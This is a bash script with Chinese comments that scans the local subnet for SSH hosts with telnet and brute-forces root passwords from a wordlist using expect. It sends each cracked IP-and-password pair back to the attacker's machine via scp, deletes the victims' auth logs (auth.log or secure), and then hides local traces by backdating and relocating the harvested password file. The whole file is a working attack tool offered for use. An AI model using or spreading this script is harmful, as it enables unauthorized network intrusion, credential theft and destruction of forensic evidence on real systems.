#!/bin/bash
# Author:Tremb1e

# 显示本机IP，使用CIDR显示内网范围
local_ip=`ifconfig ens33|grep inet|grep -v 127.0.0.1|grep -v inet6|awk '{print $2}'|tr -d "addr:"`
local_netmask=`ifconfig ens33|grep inet|grep -v 127.0.0.1|grep -v inet6|awk '{print $4}'|tr -d "addr:"`
echo 本机IP为：$local_ip
echo 内网子网掩码为：$local_netmask

# 输出扫描范围
ip_range=${local_ip%.*}.0/24
echo 扫描范围：$ip_range

# 本机的root账号密码
local_pass=$1
echo $local_pass

# 使用telnet命令来检测存活主机，并将所有结果存入telnet_result.txt
for i in {2..254}
do
   ip=${local_ip%.*}.$i    
   
   echo "telnet $ip"
   
   telnet $ip 22 >> telnet_result.txt

done

# 将telnet_result.txt文件中的telnet成功的例子存入telnet_alive.txt
cat telnet_result.txt | grep -B 1 \] | grep [0-9] | awk '{print $3}' | cut -d '.' -f 1,2,3,4 >> telnet_alive.txt

#rm telnet_result.txt
# 输出telnet连接成功的IP

while read line
do
    echo alive_ip:$line
done < ./telnet_alive.txt

# 使用openssh服务，爆破连接服务器

while read ip
do

    while read password
    do
    
    expect <<EOF  
            set timeout 3 
            spawn ssh root@$ip
            expect { 
                "yes/no" { send "yes\n" ; exp_continue } 
                "assword" { send "$password\n" }
            } 
            expect "Permission*" {send "\n"}
            expect "#" { 
            send "sudo mkdir /home/demo\n" ;
            send "sudo touch /home/demo/$ip+$password\n" ; 
            send "sudo scp /home/demo/$ip+$password root@$local_ip:/home/ip\n" ;
            expect { 
                "yes/no" { send "yes\n" ; exp_continue }
                "assword" { send "$local_pass\n" ; exp_continue }
                   }
            send "sudo rm -rf /home/demo\n" ;
            send "cat /proc/version\n" ;
            expect "Ubuntu/Debian" { send "sudo rm /var/log/auth.log\n" ; }
            expect "Red Hat" { send "sudo rm /var/log/secure\n" ; }
            }
            expect "#" { send "exit\n" }
    
    expect eof
EOF
# 检测文件传输过来后，退出while循环

    if [ -f "/home/ip/$ip+$password" ] ; then
    break;
    fi
    
    done < ./password.txt

done < ./telnet_alive.txt

# 遍历获取传输的文件名，存到pass.txt中
path=/home/ip
files=$(ls $path)
for filename in $files
do
   echo $filename >> pass_nontools.txt
done

# 清除痕迹
echo 开始清理痕迹
sudo rm telnet_result.txt telnet_alive.txt
echo 生成文件已删除
sudo rm 
echo 源文件已恢复
sudo touch -r /etc/hosts pass_nontools.txt
sudo mv pass_nontools.txt /etc
echo 保存密码文件时间已修改，已转移文件夹





















